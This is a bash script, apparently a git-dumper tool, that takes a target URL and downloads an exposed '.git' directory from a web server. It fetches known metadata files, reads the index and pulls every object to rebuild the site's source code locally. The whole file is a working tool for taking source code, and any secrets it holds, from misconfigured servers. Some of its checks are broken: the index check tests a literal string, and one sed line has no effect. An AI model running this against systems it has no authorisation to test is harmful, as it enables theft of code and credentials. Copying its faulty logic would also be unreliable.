#!/bin/bash

POSITIONAL=()
while [[ $# -gt 0 ]]
do
key="$1"

case $key in
    -h|--help)
    HELP=YES
    shift # past argument
    ;;
    -f|--force)
    FORCE=YES
    shift # past argument
    ;;
    *)    # unknown option
    POSITIONAL+=("$1") # save it in an array for later
    shift # past argument
    ;;
esac
done
set -- "${POSITIONAL[@]}" # restore positional parameters

if [ ! -z ${HELP} ] || [ -z ${POSITIONAL[0]} ]
then
	echo "Usage : $0 [-h|--help] [-f|--force] url/ dir_out/"
	echo "Url like http://adresse/path/.git/"
	echo "Directory with a / at the end please"
	exit
fi


url="${POSITIONAL[0]}"
directory="${POSITIONAL[1]}"

# known files in .git folder
base_url=("HEAD" "ORIG_HEAD" "FETCH_HEAD" "MERGE_HEAD" "MERGE_MODE" "MERGE_MSG" \
"objects/info/packs" "description" "config" \
"COMMIT_EDITMSG" "index" "packed-refs" "refs/heads/master" "refs/remotes/origin/HEAD" \
"refs/stash" "logs/HEAD" "logs/refs/heads/master" "logs/refs/remotes/origin/HEAD" \
"info/refs" "info/exclude" "../.gitignore" "../.gitmodules"  \
"hooks/applypatch-msg" "hooks/commit-msg" "hooks/post-commit" "hooks/post-receive" \
"hooks/post-update" "hooks/pre-applypatch" "hooks/pre-commit" "hooks/pre-rebase" \
"hooks/prepare-commit-msg" "hooks/update")

echo -e "\033[34m[-] Initialisation of repository\033[0m"

# initialisation of git directory
mkdir -p ${directory}
git init ${directory}
echo "Target : ${url}"

# retrieving all the known files we can
for file in ${base_url[@]}
do
	HTTP_STATUS=$(curl --silent -w "%{http_code}" "${url}${file}" --create-dirs -o "${directory}.git/${file}" 2>&1)
	if [ ${HTTP_STATUS} == "200" ]
    then
    	if [ ${file} == "index" ]
    	then
    		INDEX="yes"
    	fi
    	echo -e "\033[32m[+] ${file} found !\033[0m"
    	echo "${file}" >> ${directory}retrieved.txt
    else
    	rm "${directory}.git/${file}"
    	echo -e "\033[31m[-] Could not retrieve ${file}\033[0m"
    fi
done

# can't continue without index file
if [ -z INDEX ]
then
	echo -e "\033[31m[-] Index file could not be retrieved. Terminating."
	exit
fi

# get hash from index and formating 
cd "${directory}"
git ls-files --stage > files.txt
sed "s/\t/ /" files.txt > /dev/null
echo "" >> retrieved.txt
echo "File retrieved :" >> retrieved.txt

# curl that list
while read -r line
do
	# get the hash and the path to save it to its rightful place
    hash_file=$(echo $line | cut -f2 -d" ")
    path=$(echo $line | cut -f4 -d" ")

    # actual work begins
    HTTP_STATUS=$(curl --silent -w "%{http_code}" "${url}objects/${hash_file:0:2}/${hash_file:2}" --create-dirs -o ".git/objects/${hash_file:0:2}/${hash_file:2}" 2>&1)

    # if the request went ok save it
    if [ ${HTTP_STATUS} == "200" ]
    then
    	echo -e "\033[32m[+] ${path} retrieved\033[0m"
    	mkdir -p $(dirname ${path})
    	git cat-file -p ${hash_file} > ${path}
    	echo "${path}" >> retrieved.txt
    else
    	# if we want to be sure that there wasn't a problem during the request, doing it a second time
    	if [ ! -z ${FORCE} ]
    	then
    		echo "Retrying..."
    		HTTP_STATUS=$(curl --silent -w "%{http_code}" "${url}objects/${hash_file:0:2}/${hash_file:2}" --create-dirs -o ".git/objects/${hash_file:0:2}/${hash_file:2}" 2>&1)

		    if [ ${HTTP_STATUS} == "200" ]
		    then
		    	echo -e "\033[32m[+] ${path} retrieved\033[0m"
		    	mkdir -p $(dirname ${path})
		    	git cat-file -p ${hash_file} > ${path}
		    	echo "${path}" >> retrieved.txt
		    else
		    	rm ".git/objects/${hash_file:0:2}/${hash_file:2}"
		    	echo -e "\033[31m[-] Could not retrieve ${path}\033[0m"
		    fi
    	else
    		# if the request went not ok, rm it 
	    	rm ".git/objects/${hash_file:0:2}/${hash_file:2}"
	    	echo -e "\033[31m[-] Could not retrieve ${path}\033[0m"
	    fi
    fi
done < "files.txt"
